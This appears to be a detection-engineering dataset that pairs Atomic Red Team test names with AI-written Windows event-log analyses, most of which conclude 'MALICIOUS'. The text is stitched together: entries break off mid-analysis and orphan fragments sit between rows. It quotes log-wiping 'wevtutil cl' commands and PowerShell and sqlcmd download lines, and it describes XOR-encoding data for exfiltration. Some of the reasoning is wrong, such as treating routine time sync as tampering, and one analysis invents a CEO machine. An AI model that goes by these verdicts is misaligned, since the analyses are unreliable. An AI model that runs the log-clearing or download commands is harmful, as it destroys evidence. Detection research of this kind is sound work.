Download a file with IMEWDBLD.exe,"In analyzing the provided event logs, several activities indicate potentially malicious behavior:

1. **Log Clearing Events**: 
   - The logs for System, Windows PowerShell, and Security channels have been cleared by the user `admin_test`. This action is highly suspicious, as log clearing can be an indicator of a malicious actor attempting to hide their tracks.

2. **Use of `wevtutil.exe`**:
   - There are multiple Sysmon events showing the use of `wevtutil.exe` to clear logs (via the command `wevtutil cl`). This utility is often used by attackers to cover their activities, as it can clear specific event logs on Windows systems.

3. **Suspicious PowerShell Command Execution**:
   - A PowerShell command was executed which included a script downloaded from a remote server, specifically from a GitHub repository (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml`). This behavior suggests the downloading of potentially malicious or unauthorized scripts from the internet, which could lead to code execution vulnerabilities.

4. **High Integrity Process Execution**:
   - The suspicious commands were executed with high integrity levels by the user `SERVER002\admin_test`, indicating administrative privileges were used.

5. **Privileged Access**:
   - Several privileges were assigned to the user `admin_test`, including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeTakeOwnershipPrivilege`, which are typically not necessary for regular users and can be leveraged for malicious purposes.

6. **Process Execution Chain**:
   - The execution of several processes, such as `IMEWDBLD.exe` and `dllhost.exe`, stem from suspicious command lines, which include the downloading of external scripts.

7. **Abnormal Logon Sessions**:
   - The target logon ID `0x13BB98` was used multiple times with NTLM authentication from a remote workstation `DESKTOP-3HL5B2P`, indicating remote access that could be unauthorized.

**Assessment**: These combined activities strongly suggest that there was an attempt to perform unauthorized actions with potentially malicious intent, including attempts to hide these actions by clearing logs and running suspicious scripts.

**Final Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected system (`Server002`) from the network to prevent further potential compromise.
- Conduct a full forensic analysis of the system to understand the extent of the breach and gather evidence.
- Examine all accounts with administrative privileges, focusing on the account `admin_test`, and reset or disable them as needed.
- Review network logs and firewall rules to identify inbound and outbound connections associated with the suspicious IP and external script locations.
- Strengthen security monitoring to detect similar behavior in the future, possibly through enhancing EDR rules.
- Inform stakeholders about the incident and take steps to prevent similar incidents in the future through user training and improved security posture."

   Security log cleared by `admin_test` at 2024-10-24 12:28:08.2812348.
   ```

2. **Command Execution**:
   - The execution of `wevtutil.exe` to clear event logs is typically associated with attempts to cover tracks of malicious activities. The `wevtutil` command-line utility activity to clear logs was initiated several times by `admin_test`.
   - A PowerShell command used to download a file from the internet:
   ```
   ""powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt""
   ```

3. **Time Manipulation**:
   - There are entries indicating changes in system time potentially to further obfuscate logs and activity timelines:
   ```
   - Time synchronization events showing manipulations by `LOCAL SERVICE` using `svchost.exe`.
   ```
   
4. **Execution of Common Reconnaissance Tools**:
   - Execution of commands like `hostname.exe` and `whoami.exe` under `admin_test` indicate potential information gathering activity.
   
5. **Parent Process Origin**:
   - An unusual parent process usage from ""C:\\Windows\\System32\\wsmprovhost.exe"" is noted for executing `wevtutil.exe` and other command-line utilities under `admin_test`.

### Indicators of Malicious Activity:

- **Logs being cleared**: This is a significant red flag, primarily when conducted using utility tools like `wevtutil`.
- **PowerShell usage**: The command used to invoke a script from an external resource (GitHub) could indicate a scripted attack or the use of a known technique from a repository.
- **Time changes**: System time modifications could potentially be altering logs' synchronization and misleading any time-based analysis.
- **Reconnaissance Commands**: Execution of `whoami.exe` and `hostname.exe` by a high-privilege user who also performs log clearance is suspicious.

### Conclusion:
Based on the above observations of consistent log clearance activity by `admin_test`, the execution of a potentially malicious PowerShell command, intentional time manipulation, and reconnaissance activities, the events align with behaviors often associated with malicious intent and attempts to obfuscate logs.

Lolbas replace.exe use to copy UNC file,"After analyzing the provided Windows event logs, I'll summarize the observations and findings. The logs primarily demonstrate activity related to event log clearing, process execution, and use of various Windows utilities. Here's a breakdown of the key observations:

1. **Event Logs Clearing**:
   - The presence of logs indicating clearing of event logs, specifically the event ID 1102 in the Security log, and event ID 104 in the System log for channels such as System, Security, and Windows PowerShell, is highly suspicious. The user ""admin_test"" on the computer ""SERVER002"" is responsible for these actions. Clearing event logs can be an indication of an attempt to cover tracks following a malicious activity.

2. **Process Execution**:
   - Several `wevtutil.exe` processes were executed with the command-line argument to clear logs (`cl` for clear). This utility is legitimate and used for managing Windows event logs; however, its use to clear logs could indicate malicious intent:
     - `C:\\Windows\\System32\\wevtutil.exe cl Security`
     - `C:\\Windows\\system32\\wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - Similar executions for Application, System, and Windows PowerShell logs.
   - Execution of several other commands:
     - Execution of `cmd.exe` to delete a file `redcanary.cab`, followed by using `replace.exe` to manipulate files. This suggests potentially unauthorized changes or clean-up actions, possibly part of post-exploitation activity.

3. **Other Process Observations**:
   - Normal Windows utilities like `whoami.exe`, `hostname.exe`, and Windows update services for Microsoft Edge are seeing activity typical of legitimate operations or updates. These, in isolation, do not indicate malicious activity.

4. **Privilege Level**:
   - The activity is executed at a ""High"" integrity level, indicating administrative privileges. This can be concerning given the potentially malicious actions (i.e., log clearing).

**Final Assessment:**

Given the evidence of event log clearing, use of `wevtutil.exe` commands to clear various logs, and the high-level of privilege used during these operations, the observed activities are very concerning and indicative of an attempt to cover potentially malicious actions. 

Therefore, the resolution is:
- **MALICIOUS** - Logs indicate suspicious activities to alter or cover tracks, suggesting a compromise or malicious behavior.

**Recommended Actions:**
- Immediately investigate the ""admin_test"" account for potential misuse, ensuring it is not compromised.
- Check for any unauthorized access or other malicious files left behind.
- Review system configurations, ensure logging is re-enabled, and update event logging policies to include alerts for log-clearing activities.
- Conduct a thorough security assessment of the host and connected network to determine the full extent of the compromise."
DNS over HTTPS Large Query Volume,"Based on the provided Windows event logs, here is a detailed analysis of the activities:

### Suspicious Activities:

1. **Log Clearing:**
   - Multiple event logs were cleared by the user `admin_test`. This action is logged in both the System and Security event logs.
   - **System Event Log Cleared (EventID: 104)**: ""LogFileCleared"" events indicate that `admin_test` cleared multiple logs, including the System, Windows PowerShell, and Security logs.
   - **Security Log Cleared (EventID: 1102)**: The clearing of security logs is particularly concerning as it can indicate an attempt to erase tracks of potentially malicious actions.

2. **PowerShell Activity:**
   - A PowerShell script containing a loop that makes HTTP requests to an external IP (8.8.8.8) embedded in a loop is noted. This kind of activity is often associated with data exfiltration or beaconing in a compromised environment.
   - **Sysmon Log (EventID: 1)**: Indicates the execution of the PowerShell script with a command line that seems to be performing network requests to resolve domain names based on a random value.

3. **High-Privilege Token Usage:**
   - Multiple instances where the `admin_test` account has been granted high-level privileges (EventID: 4672), including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.

4. **Network and Process Anomalies:**
   - Execution of the `wevtutil.exe` command multiple times by `admin_test`. This utility is used to clear event logs, aligned with the previously mentioned log clearing.
   - **Sysmon Log (EventID: 1)**: We see multiple processes spawned by `wevtutil.exe` executing ""clearing"" commands.

5. **Credential and Access Anomalies:**
   - Multiple logon events were detected with NTLM, associated with `admin_test` and originating from an external workstation (`DESKTOP-3HL5B2P`). These logon events might indicate a lateral movement attempt or improper user access.

### Assessment and Resolution:

The combination of log clearing by an administrative user (`admin_test`), execution of suspicious PowerShell scripts, clearing of security-related logs, and the repeated usage of high-privilege tokens suggest a strong possibility of a security breach or insider threat attempting to cover tracks.

**Final Resolution: MALICIOUS**

### Recommendations:

- **Immediate Isolation**: Isolate the affected machine (`Server002`) to prevent potential data exfiltration or further lateral movement.
- **Account Investigation**: Review the usage and permissions of the `admin_test` account.

Printer Migration Command-Line Tool UNC share folder into a zip file,"Upon reviewing the provided Windows event logs for the machine ""Server002"", several activities raise concerns regarding potential malicious behavior. Below is a detailed analysis based on the logs:

1. **Log Clearing Activities**:  
   - The security log (Event ID 1102) and system log (Event ID 104) both indicate that the logs have been cleared by an account named ""admin_test."" This is a significant red flag as attackers often clear logs to hide their tracks after performing unauthorized activities.

2. **Process Execution**:  
   - There are multiple instances where ""wevtutil.exe"" is executed to clear logs, as seen in the Sysmon logs. The use of ""wevtutil.exe"" with ""cl"" (clear) command is unusual during regular operations and is typically associated with log tampering.
   - The concurrent clearing of different logs including ""Microsoft-Windows-Sysmon/Operational,"" ""System,"" ""Security,"" and ""Windows PowerShell"" is indicative of an attempt to cover malicious activities.

3. **Suspicious Command Execution**:  
   - The execution of ""cmd.exe"" with a command to delete a zip file and execute ""PrintBrm.exe"" with parameters related to the Atomic Red Team's technique (T1105) suggests a possible local file copy or execution of known attacker techniques. This highlights the likelihood of test or simulation of potential exploit (red team activity) or actual unauthorized access mimicking such techniques for stealth.

4. **Unusual Timing for Time Changes**:  
   - There are events indicating time change adjustments (Event ID 4616) made by ""svchost.exe,"" suggesting possible tampering with the system clock, a tactic which can be used to manipulate log timestamps or bypass time-based security mechanisms.

5. **User Context and Integrity**:  
   - All suspicious activities occurred under the user context ""SERVER002\\admin_test"" with high integrity, implying administrative-level access.

### Conclusion:
The events captured in the logs strongly indicate malicious activities primarily due to repeated log clearings, execution of potentially suspicious commands, tampering with system time, and the execution context being administrative. These behaviors suggest attempts at covering tracks and possibly indexing towards lateral movement within the network.

### Resolution: **MALICIOUS**

### Guidance:
- **Immediate Actions:** 
  - Isolate the affected machine (Server002) from the network to prevent potential spread or further unauthorized access.
  - Initiate a full forensic investigation to determine the scope and depth of the compromise.
  - Change all credentials associated with the ""admin_test"" account and verify the legitimacy of this account and any other accounts potentially created or altered by threat actors.

OSTAP Worming Activity,"### Detailed Analysis

#### Overview
Several log entries across different channels provide a comprehensive picture of the activities on the host `Server002`. Notably, the logs center around:
- Event log clearing activities using `wevtutil.exe`.
- Time alterations and possible impersonation attempts with svchost.exe.
- Execution of scripts and commands via `cmd.exe` and `cscript.exe`.
- Execution traces related to legitimate Microsoft Edge update activities.

#### Suspicious or Anomalous Behavior

1. **Event Log Clearing**:
   - Multiple instances of `wevtutil.exe` were executed for clearing different event channels (Sysmon, System, Security, and PowerShell logs).
   - The responsible user for these activities was `SERVER002\\admin_test`, operating under a high integrity level, which indicates administrative rights ([EventRecordIDs: 17950, 17954, 17958, 17962, 17966, 17970, 17974]).

2. **Abnormal Script Execution**:
   - A `cmd.exe` process executed commands involving `cscript.exe` to create and run a script (`AtomicTestT1105.js`) mimicking worm-like behavior ([EventRecordID: 17978]).
   - This process directly correlates to a known atomic red team test, simulating a lateral movement technique (MITRE ATT&CK T1105).

3. **Time Alteration**:
   - Multiple entries indicate time changes made by a system process `svchost.exe`. This could point to tactics like time-stomping ([EventRecordID: 30351]).

4. **Service Stoppage**:
   - The `edgeupdate` service was stopped twice, with no clear preceding events pointing explicitly to a system-enforced requirement for this action ([EventRecordID: 2384, 2385]).

#### Assessment of the Situation

- **Event Log Cleansing** by `wevtutil.exe` is undeniably suspicious. This utility is typically used in malicious activity to erase traces of actions from event logs.
- Running scripted operations that simulate worm-like behavior signals testing or malicious lateral movement preparation.
- Altering system time can be a technique to confuse log timelines and muddy investigation trails.
- The use of legitimate processes and updates (Microsoft Edge) introduces noise but appears to align with legitimate activity.

### Resolution: **MALICIOUS**

Based on the comprehensive analysis of logs indicating event log clearance through `wevtutil.exe`, scripted suspicious command execution simulating known attacks, and time manipulation tactics, the compiled threat analysis points to a **malicious** activity level.

   - There is a PowerShell command execution with a script located in a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam`), specifically executing `T1071-dns-domain-length.ps1`.
   - The command parameters include a domain and subdomain that appear to be part of a test or simulation (`127.0.0.1.nip.io` and `atomicredteamatomicredteam...`), which is related to a known adversary emulation toolset Atomic Red Team, commonly used for security testing.

2. **Logs Cleared**:
   - The security, application, and system logs were cleared (`LogFileCleared` events with Event ID 1102 in security logs), indicating an attempt to cover tracks which is often associated with malicious activities.

3. **Evidence of Tampered Log Activity**:
   - The `wevtutil.exe` command-line utility was used to clear various logs, which is a typical indicator of malicious activity aiming to delete forensic evidence.

4. **Unusual Process Executions**:
   - Frequent execution of command-line utilities (`hostname.exe`, `whoami.exe`, `conhost.exe`) that are typical in scripting scenarios or malicious reconnaissance.
   - The presence of high integrity level (indicative of administrative privileges) during these activities is a potential red flag.

5. **Microsoft Edge Update Processes**:
   - Several events related to Microsoft Edge Update processes are observed. While these seem regular as system updates, they coincide with the timeline of the suspicious PowerShell activity, indicating a potential cover or distraction or even a method to leverage legitimate processes.
  
6. **Access with Elevated Privileges**:
   - There are events that indicate a user `admin_test` with elevated privileges and a comprehensive list of privileges (Event ID 4672) performing actions including the use of `wevtutil.exe` to clear logs.

### Assessment:

The logs reveal several activities that are characteristic of malicious behavior:
- PowerShell scripts are executed from temporary directories, often a sign of transient operations to avoid detection.
- The clearing of various event logs (System, Security, Application, and PowerShell) is very suspicious and typically indicates an attempt to cover tracks following potential misuse or testing.
- The high integrity level of processes driven by `admin_test` suggests misuse of administrative credentials, potentially indicating a compromised account or insider threat.

### Conclusion:

**Resolution**: **MALICIOUS**

Given the actions observed in these logs, including the execution of suspicious PowerShell scripts, clearing of event logs, and elevated privilege usage, these activities strongly suggest a malicious compromise. Further investigation is recommended to determine the scope, intent, and impact of these activities, and immediate remediation actions should be considered, such as reviewing user access permissions, inspecting the system for further evidence of compromise, and enhancing monitoring to detect similar activities in the future."
XOR Encoded data,"Upon review of the provided Windows event logs, several activities within the logs are indicative of potentially malicious behavior:

1. **Event Log Clearing**: Multiple entries in the System log (Event ID 104) show that logs, including the System, Windows PowerShell, and Security logs, were cleared by the user 'admin_test'. This action is typically performed to hide the traces of potentially malicious activity and is a significant indicator of compromise.

2. **PowerShell Command Execution**: The Windows PowerShell log contains log entries with complex command lines that include encoding and a web request posting data to `example.com`. The command attempts to encode content from a specified path, using a simplistic XOR operation with a key and posting the result to a remote server. This pattern resembles data exfiltration attempts and is highly suspicious.

3. **Execution of Suspicious PowerShell Commands**: The Sysmon log evidences the execution of a PowerShell script, specifically with intricate command syntax suggesting potential obfuscation or malicious intent. The command line includes bypassing typical operations to manipulate data and send it over the network, which is not typical for standard operations.

4. **Processes Run with High Integrity Level**: Several processes show execution with 'High' integrity levels. These include legitimate executables like `wevtutil`, `conhost.exe`, and system utilities which were executed and could be used to conduct further malicious operations, like clearing log events or changing system settings.

Based on the malicious event log clearing activities, the use of PowerShell for encoding and potential exfiltration, and the execution of processes at high integrity level potentially for privilege abuse, this analysis concludes with the following resolution.

**Resolution: MALICIOUS**

**Recommendations**:

- **Immediate Mitigation**: Disconnect the affected system from the network to prevent further data exfiltration.
- **System Isolation**: Quarantine the system to prevent the spread of potential threats across the network.
- **Detailed Forensic Analysis**: Conduct a thorough forensic investigation of the affected machine to understand the full scope of the intrusion and identify any additional compromised systems.
- **Review Security Settings**: Reinforce access control measures and review account privileges, especially for the accounts involved in the event log activities.
- **Threat Hunt**: Perform a threat hunt across the network to ensure no other systems exhibit similar symptoms or behaviors.
- **Patch and Update**: Ensure that all systems are fully patched and running the latest security updates to mitigate potential vulnerabilities that can be exploited by the threat actors."
TeamViewer Files Detected Test on Windows,"### Detailed Analysis:

Upon investigation of the provided event logs, I have identified several points of interest that may indicate potentially malicious activity:

1. **Use of PowerShell for Download and Execution**:
   - The logs include multiple instances of PowerShell being used with `Invoke-WebRequest` to download `TeamViewer_Setup.exe` from the official TeamViewer site. The subsequent execution of this file in a silent mode (`/S`) indicates automated setup and installation without user intervention.
   - The initial event in the PowerShell logs clearly shows the command to download and execute the setup file. This sequence is suspicious because malicious actors often use similar tactics for scripts executing downloads and executing files without user interaction.

2. **System and Security Log Clearances**:
   - Logs show that logs (System and Security) have been cleared (Event ID 1102 for Security and 104 for System). This is a high indication of trying to remove traces that could suggest unauthorized or malicious activity, typically associated with malware or insider threats trying to cover their tracks.

3. **Privilege Escalation**:
   - There are multiple logon events with elevated privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.), specifically involving the account `admin_test`. The account `admin_test` is seen multiple times gaining high privileges, which could imply escalation attempts.
   - Logs also show clearing of event logs being initiated by `admin_test`. This user account seems tied to the new PowerShell activities and could be a compromised account being used to execute unauthorized actions.

4. **Scheduled Task Creation**:
   - The Sysmon logs indicate the creation of a scheduled task `TVInstallRestore` using `schtasks.exe`, setting `TeamViewer_rollbackTemp.exe` to restore upon logon. Scheduled tasks can be typical persistence mechanisms used by attackers.
   
5. **Processes Related to TeamViewer**:
   - Numerous processes associated with TeamViewer (e.g., `TeamViewer.exe`, `TeamViewer_Service.exe`, `tv_x64.exe`) are active, likely related to the setup executed by PowerShell. While TeamViewer itself is legitimate, unauthorized deployment is often used for remote access by malicious actors.

6. **Network-related Processes**:
   - Multiple connections related to Microsoft Edge updates and WebView suggest normal update activities, whereas sudden initiation could be anomalous if not duly planned or authorized. However, they are not directly suspicious without further evidence of misuse.

### Assessment of the Situation:

- The described actions within the logs, particularly the use of PowerShell for downloading and executing files, clearing of event logs, and the creation of scheduled tasks, are highly indicative of unauthorized and potentially malicious activity.
- Although TeamViewer itself is legitimate software, its unexpected deployment and the pattern of log clearance suggest a measure of stealth often associated with malicious intent.

### Resolution:

Based on the evidence from the logs, I conclude the situation as follows:

- **MALICIOUS**: The activity observed in the logs, including PowerShell execution for download and install of software, the log clearance, and unauthorized privilege escalation, strongly indicates malicious behavior with intent to remotely control or further compromise the system.

### Guidance on How to Proceed:

1. **Immediate Quarantine and Investigation**: 
   - Isolate the affected system (Server002) from the network to prevent any potential lateral movement or data exfiltration.
   - Perform a thorough investigation, including forensic analysis, to determine the full scope of the compromise.

2. **Account Review**:
   - Investigate the `admin_test` account. Change credentials, enforce MFA, and ensure it is not compromised.

3. **Incident Response**:
   - Notify the internal incident response team to handle containment, eradication, and assessment of potential data exposure.
   - Consider external assistance if the compromise extends beyond current system control.

4. **Security Measures**:
   - Implement advanced security monitoring on PowerShell activities.
   - Revise and enhance security policies surrounding use of elevated privileges and scheduled tasks.

5. **Post-Incident:** 
   - Review system and network security policies, ensuring logging configurations are reinforced to detect similar behaviors in the future.
   - Conduct a lessons-learned review to prevent future occurrences."
Tor Proxy Usage - Windows,"Based on the provided Windows event logs, here is a detailed analysis:

### Suspicious and Malicious Activity Identified

1. **Event Log Clearing:**
   - There are multiple instances of the event log clearing using `wevtutil` found in the Sysmon logs (`EventID 1`), indicating someone used the command `wevtutil.exe cl` to clear logs from the System, Security, and Windows PowerShell channels. These events were executed by the user `admin_test` with high integrity level, suggesting potentially unauthorized or malicious activity to hide traces.

2. **Unusual PowerShell Activity:**
   - The PowerShell logs indicate execution of potentially encoded commands and invocation of external payloads through the PowerShell script. This includes a suspicious PowerShell command trying to run `tor.exe` from a location (""`\\..\\ExternalPayloads\\tor\\Tor\\tor.exe`""), indicating a potentially malicious action or testing using Atomic Red Team templates, which are commonly used for penetration testing and threat emulation.
   - Another PowerShell activity involved encoded commands which are typically used to obfuscate what script the attacker is trying to run.
   
3. **Security Log Events:**
   - Security logs show a large number of logon events (4624) with privileged service accounts, and special privilege assignments (4672). There is high usage of SYSTEM accounts and NT AUTHORITY, and consistent events attempting to authenticate and assign high privileges (SeDebugPrivilege, SeTcbPrivilege, etc.).
   - Logon Type 5 (Service Startup) was detected repeatedly with NTLM authentication, often used by attackers for lateral movement or persistence.
   
4. **Sysmon Logs - Process Executions:**
   - Multiple instances of process executions that typically denote system utilities or diagnostic tools being used aggressively in a short period of time, potentially indicating automation or scripted attack such as:
     - `cmd.exe /c start powershell -encodedCommand`
     - Execution of other system utilities like `whomi.exe`, `hostname.exe`, and `wevtutil.exe` in rapid succession.
     - PowerShell and other binaries running as `NT AUTHORITY\SYSTEM` could denote privilege escalation techniques.
     
### Observations:
- The logs show evidence of actions that are characteristic of malicious activity, such as log clearing, execution of external payloads (e.g., Tor setup), and use of encoded PowerShell commands.
- The behavior aligns with techniques used in efforts to obfuscate and hide activity, suggesting a deliberate attempt to avoid detection and persist on the system.
- Continual use of elevated privileges and administrative operations in sequences may suggest the presence of scripts facilitating an attack sequence.

File Download with Sqlcmd.exe,"Based on the analysis of the provided Windows event logs, several suspicious activities indicate potential malicious intent:

### Analysis and Suspicious Activities:

1. **Log File Clearing:**
   - **EventID 104** and **EventID 1102** in the System and Security logs indicate that event logs were cleared (`wevtutil.exe` was used to clear logs for Security, System, and Windows PowerShell channels). This is typically suspicious behavior as attackers often clear logs to hide their tracks post-compromise.

2. **PowerShell Execution:**
   - The use of PowerShell with command-line arguments to download and execute a file from an external source (`powershell.exe & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\\T1105.zip}`) is highly suspicious. The reference to `T1105` ZIP file corresponds to MITRE ATT&CK technique T1105 (Ingress Tool Transfer), indicating the potential download of a tool for further operations.

3. **Execution of High Integrity Processes:**
   - High integrity processes like `wevtutil.exe`, `whoami.exe`, and `HOSTNAME.EXE` were executed by the `SERVER002\\admin_test` user, which aligns with privilege escalation and reconnaissance activities.

4. **Unusual Process Execution Patterns:**
   - A Microsoft Edge update installer (`setup.exe`) is shown executing with system-level privileges. However, the file path and invocation pattern can be considered common, this requires validation against known benign software installations if it was scheduled/authorized.

5. **Miscellaneous Reconnaissance Activities:**
   - The `whoami.exe` and `hostname.exe` executions, while not inherently malicious, can be indicators of exploratory behavior commonly seen in lateral movements.

### Final Assessment:

The events surrounding the log file clearance, unauthorized PowerShell usage to download potentially harmful tools, and the patterns of process execution all together construct a narrative of potentially malicious activity.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. Immediately isolate the affected machine (Server002) from the network to prevent further malicious operations or potential spread.
2. Conduct a full disk and memory capture to preserve evidence for further forensic analysis.
3. Perform a thorough examination of network traffic around the time of the suspicious events to identify any exfiltration or communication with malicious hosts.
4. Verify the legitimacy and integrity of the Microsoft Edge update if applicable.
5. Change all credentials associated with `SERVER002\admin_test` and possibly all privileged accounts.
6. Consider engagement with a digital forensics and incident response team to perform an in-depth investigation.
7. Review and enhance security monitoring to detect similar activities in the future and ensure event logs cannot be easily cleared.

By addressing these steps, the organization can work towards understanding the full scope of the breach and protect against future incidences."
AnyDesk Files Detected Test on Windows,"Upon analyzing the provided Windows event logs, several suspicious activities stand out suggesting potential malicious activity. Here is a breakdown of the findings:

1. **Log Clearing Activity**:

UltraViewer - RAT Execution,"### Detailed Analysis of Logs

#### **Indicators of Malicious Activity:**

1. **Clearing Event Logs:**
   - The `Security`, `System`, and `Windows PowerShell` logs were cleared (`EventID 1102` for Security and `EventID 104` for System and PowerShell) by `admin_test` shortly after executing PowerShell commands. Clearing event logs is a strong indicator of an attempt to cover up malicious activities.

2. **Use of PowerShell for Suspicious Command Execution:**
   - PowerShell was used to execute UltraViewer and its components. Typically, PowerShell execution involving unconventional paths, especially involving temporary directory locations and obscurely named files (e.g., `T1219_UltraViewer.exe`), indicates suspicious activity, especially considering the content of command line `Start-Process`.

3. **Installation and Execution of UltraViewer:**
   - The installation and execution of components like UltraViewer via PowerShell could indicate potential unauthorized remote access software installation. The installation processes triggered multiple `RegAsm.exe` executions to register .NET assemblies, which is often utilized by attackers to maintain persistence.

4. **Task Killing Pattern:**
   - `taskkill.exe` was repeatedly executed to kill processes related to `UltraViewer` which could indicate either a malfunction or possibly an attempt to terminate unauthorized processes.

5. **Privilege Utilization:**
   - There were multiple `EventID 4672` logs indicating the granting of special privileges to `admin_test`, including `SeSecurityPrivilege`, `SeTakeOwnershipPrivilege`, and `SeDebugPrivilege`, which are often exploited to maintain elevated access and control over the system.

6. **Network Events:**
   - The log indicates the presence of an IP address `192.168.0.102`, which was involved in a network connection as `admin_test` logged in. This could suggest potential remote connections to or from an unrecognized source.

#### **Assessment of the Situation:**

Given the contextual evidence gathered from the logs:

- The sequence of events involving the use of PowerShell to execute processes from non-standard directories, immediately followed by clearing of multiple log files to erase evidence, indicates attempts to cover potential unauthorized activities.
- The installation of UltraViewer and the manner it has been initiated suggest that this tool could have been used for remote access.
- Moreover, the logs demonstrate commands that are usually associated with suspicious/malicious behavior patterns, such as clearing event logs and utilizing administrative privileges.

#### **Threats or Risks Identified:**
- **Remote Access Tools (RATs):** UltraViewer could be utilized for remote management without proper authorization.
- **Data Exfiltration & System Compromise:** Since PowerShell was used, there could be risks of scripts being executed for data exfiltration or persistent control.

### **Resolution: MALICIOUS**

This activity profile enunciates clear signs of malicious activity, likely involving unauthorized remote access via UltraViewer in combination with efforts to intentionally obfuscate these actions through log clearance. Immediate containment measures, detailed forensic analysis, and possibly legal consult based on the findings are advised. Further enhanced monitoring, particularly of PowerShell activity and remote access controls, should be implemented."
RemotePC Software Execution,"Based on the provided logs, there are several indicators of potentially malicious activity taking place on the host, especially linked to the ""RemotePC"" application process. Here's a detailed analysis:

### Key Findings:

1. **PowerShell Execution:**
   - Multiple logs indicate the execution of a PowerShell script, specifically: `powershell.exe & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\RemotePC.exe\""}`. 
   - The command attempts to execute a file potentially located in an unusual directory path, suggesting that PowerShell was used to run the suspicious RemotePC executable. 

2. **Application Installers and Services:**
   - The `RemotePC.exe` and associated services (""RPCService"") are repeatedly seen being installed and executed, and the MSIInstaller logs indicate a quiet uninstallation command which can be interpreted as an attempt to cover tracks.
   - The service `RPCService` is set to auto-start with the `StartType` being ""auto start"". This behavior is suspicious as the service is controlled by scripts rather than manual user installation or configuration, indicating potential persistence mechanisms used by attackers.

3. **Log Clearing Events:**
   - Event logs from both the security and system channels were cleared by the user ""admin_test"". 
   - This is a classic indicator of malicious activity as attackers often clear logs post-execution to remove traces of intrusion.

4. **Credential Access and Privilege Escalation:**
   - Several security logs (Event IDs 4624, 4672) indicate successful logon events and the assignment of special privileges to the SYSTEM account, which may suggest an attempt at gaining elevated privileges on the system.

5. **Multiple Failed Credential Access Attempts:**
   - There are numerous `5379` event IDs, indicating failed attempts to retrieve credentials using varied operations against Microsoft Accounts. The repeated failures indicate possible brute-forcing tactics.

6. **Suspicious Task Execution:**
   - Events related to task execution, particularly applications being launched from system32 using `sc.exe` to create or configure services (though the exact services are not named) may be associated with launching malicious payloads or maintaining persistence.

### Resolution:

Considering all these observations, the activities represented in the logs fit patterns of known malicious tactics such as privilege escalation, program execution from suspicious directories, clearing of logs, and unauthorized service creation.

- **Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Disable and remove any services related to ""RemotePC"" or any related executable files found in user directories.
   - Block identified malicious scripts and scripts in user directories using endpoint security solutions.
   - Conduct a thorough investigation of any user accounts involved in the logging activity, specifically ""admin_test"".

2. **Preventive Measures:**
   - Implement strict access controls and monitor administrative accounts for unusual activities.
   - Ensure PowerShell logging and script-blocking policies are enabled to monitor and prevent such unauthorized executions.
   - Review system policies to log and alert on disabled services or scheduled tasks and look for odd configurations or advisories.

3. **Further Investigation:**
   - Conduct a deep scan for backdoors or persistence mechanisms left by the adversary.
   - Analyze external network traffic for anomalies potentially indicating data exfiltration.

Engage a professional incident response team if necessary to comprehensively address and mitigate the root cause of this compromise."
Testing usage of uncommonly used port with PowerShell,"Upon reviewing the Windows event logs, several activities stand out as potentially suspicious and require further scrutiny:

1. **Event Log Clearing**:
   - Events with ID `1102` in the Security log and similar events in the Sysmon log indicate the clearing of event logs by the user `admin_test`. The system logs show instances where the `wevtutil.exe` utility was used to clear logs. Clearing event logs can be an indication of an attempt to cover tracks, which is suspicious.

2. **PowerShell Activity**:
   - The Windows PowerShell log shows that PowerShell was used with the command `{Test-NetConnection -ComputerName google.com -port 8081}`. While `Test-NetConnection` itself is not inherently malicious, its use could indicate network exploration or connectivity testing relevant to non-standard operations, which can be suspicious if unexpected on the CEO's machine.

3. **Lateral Movement or Privilege Escalation Attempts**:
   - There are multiple 4624 Event IDs in the Security Log indicating logons with the SYSTEM account, and Event ID 4672 showing several privileges being assigned. The SYSTEM account gaining high privileges could be a sign of privilege escalation.

4. **Unusual Process Executions**:
   - Multiple `wevtutil.exe` processes, `conhost.exe`, and other processes such as `CompatTelRunner.exe` are launched by `admin_test`. The relationship of these processes, considering their frequent execution, suggests potential unauthorized system modifications or command-line utility uses.

5. **Failed Credential Access**:
   - Events with ID `5379` show frequent attempts and failures in accessing Microsoft accounts credentials, which could be an indicator of attempts to misuse or hijack account credentials.

6. **Repeated Microsoft Edge Update Executions**:
   - There's a significant number of logs related to the execution of `MicrosoftEdgeUpdate.exe`, which could be benign. However, the frequency and density of these events in a short time span require validation against typical Edge update processes, especially if such activity is anomalous.

Based on these observations, the logs contain multiple signs of suspicious activities indicative of potential malicious activity that warrants a thorough investigation. It is critical to validate user `admin_test` activities, cross-reference these with legitimate administrative tasks or update processes, and examine the context in which PowerShell was utilized.

**Resolution**: **SUSPICIOUS**

**Guidance to Proceed**:
- Conduct an internal inquiry with `admin_test` to verify the legitimacy of the log-clearing activities and the use of administrative tools.
- Examine system integrity and perform a deep security scan to confirm no persistence mechanisms have been established.
- Capture and review network traffic logs, specifically around the times of PowerShell activity, for any unauthorized connections.
- Implement or tighten logging and alerting mechanisms around log clearance and PowerShell execution.
- If not part of routine operations, further inspect the configuration and update process of Microsoft Edge on this system."
UltraVNC Execution,"**Detailed Analysis of the Logs:**

1. **Unusual Process Execution and Shell Commands:**
   - There are multiple instances of the ""wevtutil.exe"" utility being executed, which is used for interacting with Windows event logs. Specifically, it is seen clearing the logs for channels like ""Microsoft-Windows-Sysmon/Operational"", ""Application"", and ""Security"". The clearing of logs is a known tactic used by attackers to cover their tracks.
   - PowerShell is executed with a command to start a VNC Viewer (UltraVNC), indicating a possible attempt to establish remote control or monitoring.
   - The netsh command is used to open ports 5800 and 5900, which are commonly used by VNC, suggesting that VNC access is being enabled.
   - Execution of processes like ""setpasswd.exe"" and ""setcad.exe"" related to UltraVNC, indicating potential configuration changes or malicious setup.

2. **Log and Security Events:**
